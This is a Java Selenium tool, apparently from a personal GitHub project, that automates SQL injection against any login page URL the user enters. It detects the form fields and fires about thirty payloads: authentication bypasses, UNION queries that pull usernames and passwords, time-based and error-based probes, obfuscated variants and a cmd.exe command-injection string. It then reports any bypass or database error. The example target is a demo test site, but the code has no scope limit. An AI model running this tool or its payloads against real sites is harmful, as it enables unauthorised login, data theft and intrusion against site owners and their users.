package UI;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.edge.EdgeDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.openqa.selenium.TimeoutException;
import org.openqa.selenium.NoSuchElementException;

import io.github.bonigarcia.wdm.WebDriverManager;

import java.time.Duration;
import java.util.Scanner;
import java.util.List;
import java.util.ArrayList;

public class AdvancedSQLInjection {

	// Declares a static String variable to hold the chosen browser type (e.g., "Chrome", "Edge").
	// It's static so it can be accessed and modified by static methods like main() and setUpDriver().
	public static String browser;
	
	// Declares a static WebDriver instance. This is the main interface for controlling the browser.
	// It's static so all methods can interact with the same browser instance.
	public static WebDriver driver;

	// --- Helper class to store found login form elements ---
	// This nested static class encapsulates the three main WebElements needed for a login form:
	// username field, password field, and login button. This improves code organization
	// and makes it easier to pass these elements around as a single unit.
	static class LoginElements {
		WebElement usernameField;
		WebElement passwordField;
		WebElement loginButton;

		public LoginElements(WebElement usernameField, WebElement passwordField, WebElement loginButton) {
			this.usernameField = usernameField;
			this.passwordField = passwordField;
			this.loginButton = loginButton;
		}
	}

	// Sets up the WebDriver based on the 'browser' static variable.
	// WebDriverManager automatically handles downloading and setting up the correct
	// browser driver executable, simplifying the setup process.
	public static void setUpDriver() {
		System.out.println("Launching browser: " + browser);
		if (browser.equalsIgnoreCase("Edge")) {
			// If 'browser' is "Edge", set up and instantiate EdgeDriver.
			WebDriverManager.edgedriver().setup();
			driver = new EdgeDriver();
		} else { // Default to Chrome if 'browser' is anything else (including "Chrome").
			// Set up and instantiate ChromeDriver.
			WebDriverManager.chromedriver().setup();
			driver = new ChromeDriver();
		}
		// Maximizes the browser window for better visibility during testing.
		driver.manage().window().maximize();
	}

	// Pauses the execution for a specified number of seconds.
	// This is often used in Selenium to give the browser time to load elements
	// or to observe actions, though explicit waits are generally preferred for reliability.
	public static void pause(int seconds) {
		try {
			Thread.sleep(seconds * 1000); // Sleep takes milliseconds.
		} catch (InterruptedException e) {
			// Prints the stack trace if the thread is interrupted during sleep.
			e.printStackTrace();
			// Re-interrupts the current thread, a common practice for proper thread management.
			Thread.currentThread().interrupt();
		}
	}

	// --- Automatic detection of login form elements ---
	// This method attempts to dynamically find the username field, password field,
	// and login button on the web page using a series of common locators (By.xpath, By.name, By.id).
	// This makes the tool more versatile, as it doesn't rely on hardcoded element IDs for every target.
	public static LoginElements findLoginElements(WebDriver driver) {
		// Initializes WebDriverWait with a 10-second timeout.
		// This wait is used to ensure elements are present/clickable before interacting with them,
		// preventing NoSuchElementException if elements haven't loaded yet.
		WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10)); 

		WebElement usernameField = null;
		WebElement passwordField = null;
		WebElement loginButton = null;

		System.out.println("Attempting to automatically detect the login form...");

		// Priority locators for the password field.
		// It tries more specific locators first (like those for 'testfire.net') and then
		// falls back to more general ones (any input with type='password').
		List<By> passwordLocators = new ArrayList<>();
		passwordLocators.add(By.xpath("//input[@type='password' and @name='passw']")); // Specific for testfire
		passwordLocators.add(By.xpath("//input[@type='password' and @id='password']"));
		passwordLocators.add(By.xpath("//input[@type='password' and @name='password']"));
		passwordLocators.add(By.xpath("//input[@type='password' and contains(@id, 'pass')]"));
		passwordLocators.add(By.xpath("//input[@type='password' and contains(@name, 'pass')]"));
		passwordLocators.add(By.xpath("//input[@type='password']")); // Last resort, any password field

		for (By locator : passwordLocators) {
			try {
				// Waits until the password field element is present in the DOM.
				passwordField = wait.until(ExpectedConditions.presenceOfElementLocated(locator));
				System.out.println("  ✅ Password field found: " + locator);
				break; // Stop after finding the first one.
			} catch (TimeoutException | NoSuchElementException e) {
				// Continue to the next locator if the current one is not found within the timeout.
			}
		}

		// Priority locators for the username field.
		// It looks for text or email input fields that are not the password field.
		List<By> usernameLocators = new ArrayList<>();
		usernameLocators.add(By.xpath("//input[@type='text' and @name='uid']")); // Specific for testfire
		usernameLocators.add(By.xpath("//input[@type='text' and @id='username']"));
		usernameLocators.add(By.xpath("//input[@type='text' and @name='username']"));
		usernameLocators.add(By.xpath("//input[@type='text' and contains(@id, 'user')]"));
		usernameLocators.add(By.xpath("//input[@type='email' and contains(@id, 'email')]"));
		usernameLocators.add(By.xpath("//input[@type='text' and contains(@name, 'user')]"));
		usernameLocators.add(By.xpath(
				"//input[not(@type='password') and (contains(@id, 'user') or contains(@name, 'user') or contains(@id, 'login') or contains(@name, 'login'))]"));
		usernameLocators.add(By.xpath("//input[not(@type='password') and (@type='text' or @type='email')]")); // More general, not password

		for (By locator : usernameLocators) {
			try {
				// Waits until the username field element is present in the DOM.
				usernameField = wait.until(ExpectedConditions.presenceOfElementLocated(locator));
				// Ensures that the found username field is not the same as the password field,
				// which can happen if both fields share very generic attributes.
				if (passwordField != null && usernameField.equals(passwordField)) {
					usernameField = null; // If it's the same, ignore it and try the next locator.
					continue;
				}
				System.out.println("  ✅ Username field found: " + locator);
				break; // Stop after finding the first one.
			} catch (TimeoutException | NoSuchElementException e) {
				// Continue to the next locator.
			}
		}

		// Priority locators for the login button.
		// Looks for submit buttons or buttons with common login-related text/values.
		List<By> buttonLocators = new ArrayList<>();
		buttonLocators.add(By.name("btnSubmit")); // Specific for testfire
		buttonLocators.add(By.xpath("//input[@type='submit']"));
		buttonLocators.add(By.xpath("//button[@type='submit']"));
		// XPath to find buttons containing 'login' or 'sign in' (case-insensitive).
		buttonLocators.add(By.xpath(
				"//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'login')]"));
		buttonLocators.add(By.xpath(
				"//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'sign in')]"));
		// XPath to find input elements with 'login' or 'sign in' as value (case-insensitive).
		buttonLocators.add(By.xpath(
				"//input[contains(translate(@value, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'login')]"));
		buttonLocators.add(By.xpath(
				"//input[contains(translate(@value, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'sign in')]"));

		for (By locator : buttonLocators) {
			try {
				// Waits until the login button is present and clickable.
				loginButton = wait.until(ExpectedConditions.elementToBeClickable(locator));
				System.out.println("  ✅ Login button found: " + locator);
				break; // Stop after finding the first one.
			} catch (TimeoutException | NoSuchElementException e) {
				// Continue to the next locator.
			}
		}

		// Checks if all three crucial elements were found.
		if (usernameField != null && passwordField != null && loginButton != null) {
			System.out.println("  👍 All required form elements found automatically.");
			// Returns a new LoginElements object containing the found elements.
			return new LoginElements(usernameField, passwordField, loginButton);
		} else {
			// Prints an error if not all elements were found, guiding the user to manual inspection.
			System.err.println("  ❌ Failed to automatically find all login elements.");
			System.err.println("    Check the page's HTML and adjust locators manually if necessary.");
			System.err.println("    Found: Username: " + (usernameField != null) + ", Password: "
					+ (passwordField != null) + ", Button: " + (loginButton != null));
			return null; // Returns null if elements are missing, indicating failure.
		}
	}

	public static void main(String[] args) {
		// ASCII art logo for console output, purely for aesthetics.
		String asciiArt = "  ____  ____  __    _  _  _  _  ____ \n" + " (  _ \\(  __)(  )  / )( \\( \\/ )(  __)\n"
				+ "  ) D ( ) _) / (_/\\) \\/ ( )  (  ) _) \n" + " (____/(____)\\____/\\____/(_/\\_)(____)\n"
				+ "***************************************\n" + "* Copyright 2025, ★DSL★         *\n"
				+ "* https://github.com/DSL-21         *\n" + "***************************************";
		System.out.println(asciiArt); // Prints the logo to the console.
		System.out.println("--- Advanced SQL Injection ---");

		Scanner scanner = new Scanner(System.in); // Initializes a Scanner to read user input from the console.
		String targetUrl = ""; // Declares a variable to store the target URL.

		// --- User interaction: First, select the browser ---
		System.out.println("\nSelect browser for testing:");
		System.out.println("1. Chrome (default)");
		System.out.println("2. Edge");
		System.out.print("Enter number (1 or 2): ");
		String browserChoice = scanner.nextLine().trim(); // Reads user's browser choice and trims whitespace.

		// Uses a switch statement to set the 'browser' static variable based on user input.
		// If the input is "2", it's Edge. Otherwise (including "1" or invalid input), it defaults to Chrome.
		switch (browserChoice) {
		case "2":
			browser = "Edge";
			break;
		case "1":
		default: // Any other input, or empty input, defaults to Chrome.
			browser = "Chrome";
			break;
		}
		// --- END OF BROWSER SELECTION ---

		// Prompts the user to enter the target URL.
		System.out.println(
				"Please, enter the URL of the website to perform SQL Injection test on (e.g., https://demo.testfire.net/login.jsp):");
		targetUrl = scanner.nextLine(); // Reads the target URL from user input.

		// --- Input validation for URL format ---
		// Checks if the entered URL starts with "http://" or "https://".
		// This is crucial because WebDriver's .get() method requires a full URL including the protocol.
		if (!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://")) {
			// If missing, automatically prepends "https://" to the URL.
			// This is a common and safe assumption for modern web applications.
			System.out.println("  ℹ️ URL protocol missing. Prepending 'https://' to: " + targetUrl);
			targetUrl = "https://" + targetUrl;
		}

		setUpDriver(); // Calls the setUpDriver method to initialize and launch the chosen browser.
		System.out.println("🧪 Starting advanced SQL Injection test on: " + targetUrl);

		// Array containing various SQL Injection payloads.
		// These payloads are designed to test for different types of SQLi vulnerabilities:
		// authentication bypass, union-based, time-based blind, and error-based.
		String[] sqlPayloads = {
				// Basic authentication bypasses
				"' OR '1'='1", "' OR 1=1 --", "' OR '1'='1' --", "' OR 1=1#", "' OR 1=1/*", "' OR ''='", "admin' --",
				"' OR 'x'='x", "' or ''='", "'='", "1'1", "' OR 'test'='test", "\" OR \"1\"=\"1",

				// Union SELECT injections (for data retrieval) - assumes 2 or 3 columns on a demo web.
				// WARNING: These payloads are specific to the number of columns and table/column names
				// on the target application. They must be adapted for a different page!
				"' UNION SELECT null, null--", "' UNION SELECT null, null, null--",
				"' UNION SELECT username, password FROM Users--", // Tries to select from a 'Users' table
				"' UNION SELECT 1, 'injected_user', 'injected_pass'--", // Generic column data
				"' UNION SELECT @@version, database()--", // MySQL/SQL Server version and database name
				"' UNION SELECT banner, null FROM v$version--", // Oracle version

				// Time-based Blind SQL Injection (if the page doesn't change but there's a delay)
				// WARNING: These payloads will cause significant delays in the test.
				"' OR SLEEP(5)--", // MySQL/PostgreSQL
				"' WAITFOR DELAY '0:0:05'--", // MS SQL Server
				"' AND 1=(SELECT SLEEP(5))--", // Another MySQL/PostgreSQL variation

				// Error-based SQL Injection (attempt to cause an error to gain information)
				// WARNING: These payloads are specific to the database type.
				"' AND (SELECT 1 FROM non_existent_table)--", // General error (e.g., table not found)
				"' AND 1=CAST((SELECT @@version) AS INT)--", // Type conversion error for SQL Server version
				"' AND 1=UTL_INADDR.get_host_name((SELECT user FROM dual))--", // Oracle specific for hostname via user

				// Obfuscation and other techniques
				"%27%20OR%20%271%27%3D%271", // URL-encoded version of "' OR '1'='1"
				"'/**/OR/**/'1'='1", // SQL comments for obfuscation
				"' AND '1'='1' UNION SELECT 1,2,3/*",
				"' or getpgid(0)=0--", // PostgreSQL specific system function
				"'; exec 'cmd.exe /c calc.exe' --", // OS command injection (extremely rare and dangerous, mostly for lab environments)
		};

		// Indicators used to determine if a login bypass was successful.
		String successLoginIndicator = "Congratulations!";
		String welcomeTextIndicator = "Welcome";

		// Array of common database error messages. If any of these strings appear
		// in the page source after injection, it suggests an error-based SQLi vulnerability.
		String[] databaseErrorIndicators = { "SQLSTATE", "ORA-", "syntax error", "mysql_fetch_array()", "odbc_exec()",
				"Warning: mysql_query()", "Unclosed quotation mark",
				"supplied argument is not a valid MySQL result resource", "Fatal error", "exception",
				"java.sql.SQLException", "Access denied for user", "column count doesn't match value count" };

		boolean injectionFound = false; // Flag to track if any injection was successful.

		// Loop through each SQL payload to test it against the target URL.
		for (int i = 0; i < sqlPayloads.length; i++) {
			String currentPayload = sqlPayloads[i];
			long startTime = System.currentTimeMillis(); // Records start time for time-based injection detection.

			driver.manage().deleteAllCookies(); // Clears browser cookies before each attempt to ensure a clean state.
			driver.get(targetUrl); // Navigates to the target URL.

			System.out.println("\n--- Attempt #" + (i + 1) + " with payload: " + currentPayload + " ---");

			try {
				// Attempts to find login elements using the helper function.
				LoginElements elements = findLoginElements(driver);
				if (elements == null) {
					// If elements are not found, print an error and break the loop, as further
					// attempts won't be successful without the form.
					System.err.println("  ❌ Cannot proceed, login elements were not found.");
					break; 
				}

				WebElement usernameField = elements.usernameField;
				WebElement passwordField = elements.passwordField;
				WebElement loginButton = elements.loginButton;

				// Clears any pre-filled text in the input fields and sends the current payload.
				usernameField.clear();
				passwordField.clear();
				usernameField.sendKeys(currentPayload); // Injects the payload into the username field.
				passwordField.sendKeys(currentPayload); // Injects the payload into the password field (common practice).
				loginButton.click(); // Clicks the login button to submit the form.

				// Initializes WebDriverWait for checking post-submission conditions.
				WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));

				boolean bypassed = false; // Flag for successful authentication bypass.
				boolean errorDetected = false; // Flag for database error detection.
				String detectedErrorMessage = ""; // Stores the specific error message found.

				// 1. Check for time-based injection.
				// If the payload contains 'SLEEP' or 'WAITFOR DELAY', it's a time-based test.
				if (currentPayload.contains("SLEEP") || currentPayload.contains("WAITFOR DELAY")) {
					long endTime = System.currentTimeMillis();
					long responseTime = endTime - startTime; // Calculates the response time.
					// If the response time is significantly longer than expected (e.g., > 4 seconds),
					// it suggests a time-based injection was successful.
					if (responseTime > 4000) { // 4000ms is chosen because the sleep payloads typically add 5 seconds.
						System.out.println(
								"  ✅ Time-based SQL Injection DETECTED! Response time: " + responseTime + "ms");
						injectionFound = true; // Mark as vulnerable.
						bypassed = true; // Consider it a successful bypass for this attempt.
					}
				}

				// 2. Check for successful login (authentication bypass).
				// Tries to wait for indicators of a successful login:
				// - A URL change to "bank.jsp" (specific to demo.testfire.net).
				// - Presence of "Congratulations!" or "Welcome" text on the page.
				try {
					bypassed = wait.until(ExpectedConditions.or(ExpectedConditions.urlContains("bank.jsp"),
							ExpectedConditions.visibilityOfElementLocated(
									By.xpath("//*[contains(text(), '" + successLoginIndicator + "')]")),
							ExpectedConditions.visibilityOfElementLocated(
									By.xpath("//*[contains(text(), '" + welcomeTextIndicator + "')]"))));

					if (bypassed) {
						System.out.println("  🚨 SQL Injection: AUTHENTICATION BYPASSED!");
						System.out.println("  => Current URL: " + driver.getCurrentUrl());
						injectionFound = true; // Mark as vulnerable.
						break; // Exit the loop if bypass is confirmed, no need to test further.
					}
				} catch (TimeoutException e) {
					// If a timeout occurs, it means the bypass indicators were not found.
					bypassed = false;
				}

				// 3. Check for database error messages (error-based injection).
				// Only check if no bypass was detected in the previous step.
				if (!bypassed) {
					String pageSource = driver.getPageSource(); // Gets the entire HTML source of the page.
					// Iterates through known database error indicators.
					for (String error : databaseErrorIndicators) {
						// Checks if any error indicator is present in the page source (case-insensitive).
						if (pageSource.toLowerCase().contains(error.toLowerCase())) {
							errorDetected = true;
							detectedErrorMessage = error;
							break; // Stop after finding the first error.
						}
					}
					if (errorDetected) {
						System.out.println("  🚨 SQL Injection: DATABASE ERROR DETECTED!");
						System.out.println("  => Detected error message: '" + detectedErrorMessage + "'");
						injectionFound = true; // Mark as vulnerable.
						break; // Exit the loop if an error is confirmed.
					}
				}

				// If neither bypass nor error was detected, the attempt failed.
				if (!bypassed && !errorDetected) {
					System.out.println("  ❌ Attempt failed: Input rejected or no vulnerability detected.");
				}

			} catch (Exception e) {
				// Catches any general exceptions during the payload attempt (e.g., element not interactable).
				System.out.println("  ⚠️ An error occurred during test with payload: " + currentPayload);
				System.out.println("  Error: " + e.getMessage());
				// The loop continues to the next payload, unless it was a fundamental error like
				// login elements not being found at all (handled by the 'if (elements == null)' block).
			}
		}

		pause(3); // Pauses for 3 seconds before closing the browser.
		driver.quit(); // Closes the browser and terminates the WebDriver session.
		scanner.close(); // Closes the Scanner to release system resources.
		System.out.println("\n🔚 Test finished.");
		// Final summary of the test results.
		if (injectionFound) {
			System.out.println("🎉 SQL Injection vulnerability DETECTED during the test with at least one payload!");
		} else {
			System.out.println("😞 SQL Injection vulnerability NOT detected by any of the tested payloads.");
		}
	}
}